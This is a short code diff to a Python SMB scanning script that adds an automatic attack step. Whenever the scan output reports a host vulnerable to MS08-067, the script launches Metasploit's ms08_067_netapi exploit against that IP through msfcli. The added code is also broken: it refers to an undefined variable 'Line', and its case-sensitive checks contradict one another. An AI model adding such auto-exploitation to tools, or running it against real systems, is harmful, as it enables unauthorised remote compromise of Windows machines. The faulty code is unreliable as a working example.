@@ -32,8 +32,12 @@ def main(args):
     nbtresults = subprocess.check_output(NBTSCAN, shell=True)
     lines = nbtresults.split("\n")
     for line in lines:
-        if "Vulnerable" in line:
+        if "VULNERABLE" in line:
             print('FOUND SMB VULN on ' +ip+ ": " +line)
+        if "MS08-067:" in Line and "Vulnerable" in line and "NOT" not in line:
+            print("Exploiting MS08-067")
+            cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
+            subprocess.call(cmd.split(" "))
 
 if __name__=='__main__':
     main(sys.argv)
